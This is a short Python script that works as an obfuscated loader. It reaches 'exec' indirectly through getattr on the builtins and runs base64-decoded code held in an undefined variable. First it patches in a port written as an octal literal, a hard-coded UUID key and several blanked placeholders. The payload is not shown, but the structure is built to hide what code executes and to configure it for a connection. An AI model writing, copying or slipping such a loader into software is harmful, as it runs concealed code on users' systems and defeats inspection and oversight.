import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "1b39f5c9-d858-4a5e-b161-f4a150151ffc")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)